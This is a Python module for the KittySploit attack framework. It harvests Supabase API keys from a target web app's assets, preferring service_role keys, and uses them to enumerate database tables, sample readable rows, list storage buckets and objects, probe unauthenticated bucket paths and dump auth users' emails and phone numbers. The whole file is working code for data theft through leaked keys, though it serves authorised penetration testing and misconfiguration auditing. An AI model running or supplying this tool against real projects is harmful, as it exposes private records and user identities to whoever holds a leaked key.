#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Enumerate Supabase PostgREST tables and Storage buckets using a leaked JWT key.

Follow-up for scanner/http/supabase_key_exposure_detect: given a project ref and
anon/service_role key, pulls the OpenAPI schema, probes readable tables, lists
storage buckets/objects, and checks common public bucket paths.
"""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.supabase_probe import (
    DEFAULT_PUBLIC_BUCKETS,
    classify_supabase_key,
    collect_http_bodies,
    decode_supabase_jwt,
    enumerate_auth_users,
    extract_supabase_findings,
    fetch_openapi_schema,
    list_storage_buckets,
    list_storage_objects,
    mask_token,
    parse_openapi_tables,
    probe_public_storage_object,
    probe_table_rows,
    validate_supabase_key,
)


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Supabase PostgREST / Storage Enumeration",
        "description": (
            "Uses a Supabase project ref and JWT API key (anon or service_role) to enumerate "
            "PostgREST tables via OpenAPI, sample readable rows, list Storage buckets/objects, "
            "and probe common public bucket paths. Can auto-discover credentials from the "
            "target SPA when PROJECT_REF / API_KEY are omitted."
        ),
        "author": ["KittySploit Team"],
        "tags": [
            "supabase",
            "postgrest",
            "storage",
            "enumeration",
            "rls",
            "cloud",
            "misconfig",
            "auxiliary",
            "nocode",
        ],
        "references": [
            "https://supabase.com/docs/guides/api",
            "https://supabase.com/docs/guides/storage",
            "https://supabase.com/docs/guides/database/postgres/row-level-security",
        ],
        "modules": ["scanner/http/supabase_key_exposure_detect"],
        "agent": {
            "risk": "intrusive",
            "effects": ["network_probe", "data_exfiltration"],
            "expected_requests": 25,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "risk_signals", "exploit_paths"],
            "cost": 1.5,
            "noise": 0.45,
            "value": 1.2,
            "requires": {
                "capabilities_any": ["secret_exposure", "cloud_backend"],
                "tech_hints_any": ["supabase"],
            },
            "chain": {
                "consumes_capabilities": [
                    {"capability": "secret_exposure", "from_detail": "supabase_keys"},
                ],
                "produces_capabilities": [
                    {"capability": "data_exposure", "from_detail": "readable_postgrest_tables"},
                    {"capability": "cloud_storage", "from_detail": "supabase_buckets"},
                ],
                "suggested_followups": [],
            },
        },
    }

    project_ref = OptString("", "Supabase project ref (subdomain before .supabase.co)", False)
    api_key = OptString("", "Supabase JWT API key (anon or service_role)", False)
    auto_discover = OptBool(
        True,
        "Scrape RHOSTS SPA assets for Supabase URL/key when options are empty",
        False,
    )
    enum_tables = OptBool(True, "Fetch PostgREST OpenAPI schema and list tables", False)
    probe_tables = OptBool(True, "Try SELECT on discovered tables (limit sample)", False)
    enum_storage = OptBool(True, "List Storage buckets and objects accessible to the key", False)
    probe_public_buckets = OptBool(
        True,
        "Try common public bucket/object paths without authentication",
        False,
    )
    enum_auth_users = OptBool(
        True,
        "If key is service_role, enumerate auth users via /auth/v1/admin/users",
        False,
    )
    max_tables = OptInteger(40, "Max tables to probe", False, advanced=True)
    row_sample = OptInteger(3, "Rows to sample per readable table", False, advanced=True)
    max_objects = OptInteger(15, "Max storage objects to list per bucket", False, advanced=True)
    public_probe_paths = OptString(
        ".emptyFolderPlaceholder,index.html,README.txt,.gitkeep",
        "Comma-separated object paths to probe under guessed public buckets",
        False,
        advanced=True,
    )

    def _pick_credentials(self):
        ref = str(self.project_ref or "").strip()
        key = str(self.api_key or "").strip()
        role = classify_supabase_key(key) if key else ""

        if ref and key:
            return ref, key, role, "options"

        if not self._to_bool(self.auto_discover):
            return "", "", "", ""

        print_status("Auto-discovering Supabase credentials from target SPA assets…")
        bodies = collect_http_bodies(self.http_request)
        findings = []
        for path, text in bodies:
            findings.extend(extract_supabase_findings(text[:750_000], source=path))

        key_findings = [f for f in findings if f.get("token")]
        if not key_findings:
            return "", "", "", ""

        # Prefer service_role, then anon, then any JWT
        def rank(item):
            role_name = str(item.get("role") or "")
            if role_name == "service_role":
                return 0
            if role_name == "anon":
                return 1
            return 2

        key_findings.sort(key=rank)
        chosen = key_findings[0]
        ref = ref or str(chosen.get("project_ref") or "").strip()
        key = key or str(chosen.get("token") or "").strip()
        role = classify_supabase_key(key, var_name=str(chosen.get("var_name") or ""))
        if not ref and key:
            payload = decode_supabase_jwt(key) or {}
            ref = str(payload.get("ref") or "").strip()
        return ref, key, role, chosen.get("source") or "auto_discover"

    def _severity(self, *, role, readable_tables, buckets, public_hits, users):
        if role == "service_role" and (readable_tables or users):
            return "critical"
        if role == "service_role":
            return "high"
        if readable_tables or public_hits:
            return "high"
        if buckets:
            return "medium"
        return "info"

    def run(self):
        project_ref, api_key, role, source = self._pick_credentials()
        if not project_ref or not api_key:
            print_error("Missing Supabase project_ref and api_key (set options or enable auto_discover)")
            return False

        print_status(
            f"Supabase enum — ref={project_ref} role={role or 'unknown'} key={mask_token(api_key)} source={source or 'manual'}"
        )

        self._configure_session()
        verify_ssl = self._to_bool(self.verify_ssl)

        live, live_detail = validate_supabase_key(
            project_ref,
            api_key,
            self.session,
            verify_ssl=verify_ssl,
        )
        if not live:
            print_error(f"API key rejected or unreachable ({live_detail})")
            return False
        print_success(f"Supabase REST API reachable ({live_detail})")

        tables = []
        readable = []
        buckets = []
        bucket_objects = []
        public_hits = []
        users = []

        if self._to_bool(self.enum_tables):
            print_status("Fetching PostgREST OpenAPI schema…")
            schema, detail = fetch_openapi_schema(
                project_ref,
                api_key,
                self.session,
                verify_ssl=verify_ssl,
            )
            if not schema:
                print_warning(f"OpenAPI schema unavailable: {detail}")
            else:
                tables = parse_openapi_tables(schema)
                print_info(f"Discovered {len(tables)} PostgREST table(s)/view(s)")
                if tables:
                    preview = ", ".join(tables[:20])
                    if len(tables) > 20:
                        preview += ", …"
                    print_info(preview)

        if self._to_bool(self.probe_tables) and tables:
            limit = int(getattr(self.max_tables, "value", None) or self.max_tables or 40)
            sample = int(getattr(self.row_sample, "value", None) or self.row_sample or 3)
            print_status(f"Probing up to {limit} table(s) for readable rows…")
            for table in tables[: max(1, limit)]:
                result = probe_table_rows(
                    project_ref,
                    api_key,
                    self.session,
                    table,
                    limit=sample,
                    verify_ssl=verify_ssl,
                )
                if result.get("readable"):
                    readable.append(result)
                    cols = ", ".join(result.get("sample_columns") or []) or "?"
                    print_good(
                        f"Readable: {result['table']} — {result['rows_returned']} row(s)"
                        + (f", total≈{result['total_hint']}" if result.get("total_hint") else "")
                        + f" — columns: {cols}"
                    )
                else:
                    print_status(
                        f"No rows: {result.get('table')} (HTTP {result.get('status')})"
                    )

        if self._to_bool(self.enum_storage):
            print_status("Listing Storage buckets…")
            buckets, bucket_detail = list_storage_buckets(
                project_ref,
                api_key,
                self.session,
                verify_ssl=verify_ssl,
            )
            if bucket_detail != "ok":
                print_warning(f"Storage bucket list failed: {bucket_detail}")
            elif not buckets:
                print_info("No storage buckets visible to this key")
            else:
                for bucket in buckets:
                    name = bucket.get("name") or bucket.get("id")
                    public_flag = "public" if bucket.get("public") else "private"
                    print_good(f"Bucket: {name} ({public_flag})")
                    objects, obj_detail = list_storage_objects(
                        project_ref,
                        api_key,
                        self.session,
                        str(name),
                        limit=int(getattr(self.max_objects, "value", None) or self.max_objects or 15),
                        verify_ssl=verify_ssl,
                    )
                    if obj_detail == "ok" and objects:
                        bucket_objects.append({"bucket": name, "objects": objects})
                        for obj in objects[:5]:
                            print_info(f"  object: {obj.get('name')}")
                        if len(objects) > 5:
                            print_info(f"  … {len(objects) - 5} more")

        if self._to_bool(self.probe_public_buckets):
            probe_paths = [
                p.strip().lstrip("/")
                for p in str(self.public_probe_paths or "").split(",")
                if p.strip()
            ]
            candidate_buckets = list(dict.fromkeys(
                [b.get("name") for b in buckets if b.get("name")]
                + list(DEFAULT_PUBLIC_BUCKETS)
            ))
            print_status(
                f"Probing {len(candidate_buckets)} bucket name(s) x {len(probe_paths)} path(s) without auth…"
            )
            for bucket in candidate_buckets[:20]:
                for path in probe_paths[:6]:
                    hit = probe_public_storage_object(
                        project_ref,
                        str(bucket),
                        path,
                        self.session,
                        verify_ssl=verify_ssl,
                    )
                    if hit.get("accessible"):
                        public_hits.append({"bucket": bucket, "path": path, "url": hit.get("url")})
                        print_good(f"Public object: {hit.get('url')}")

        if self._to_bool(self.enum_auth_users) and role == "service_role":
            print_status("Enumerating auth users (service_role)…")
            users, users_detail = enumerate_auth_users(
                project_ref,
                api_key,
                self.session,
                verify_ssl=verify_ssl,
            )
            if users_detail != "ok":
                print_warning(f"Auth user enum failed: {users_detail}")
            elif users:
                print_good(f"Retrieved {len(users)} user(s)")
                for user in users[:10]:
                    print_info(
                        f"  {user.get('email') or user.get('phone') or user.get('id')}"
                    )
            else:
                print_info("No auth users returned")

        severity = self._severity(
            role=role,
            readable_tables=readable,
            buckets=buckets,
            public_hits=public_hits,
            users=users,
        )

        summary_bits = []
        if readable:
            summary_bits.append(f"{len(readable)} readable table(s)")
        if buckets:
            summary_bits.append(f"{len(buckets)} storage bucket(s)")
        if public_hits:
            summary_bits.append(f"{len(public_hits)} public object(s)")
        if users:
            summary_bits.append(f"{len(users)} auth user(s)")

        if not summary_bits and not tables:
            print_warning("Key is valid but no tables, storage, or public assets were exposed")
            return False

        reason = "; ".join(summary_bits) if summary_bits else f"{len(tables)} table(s) in schema only"
        print_success(f"Supabase enumeration complete — {reason}")

        self.vulnerability_info = {
            "severity": severity,
            "reason": reason,
            "project_ref": project_ref,
            "key_role": role,
            "key_masked": mask_token(api_key),
            "tables": tables,
            "readable_tables": readable,
            "storage_buckets": buckets,
            "storage_objects": bucket_objects,
            "public_objects": public_hits,
            "auth_users": users,
        }
        return True
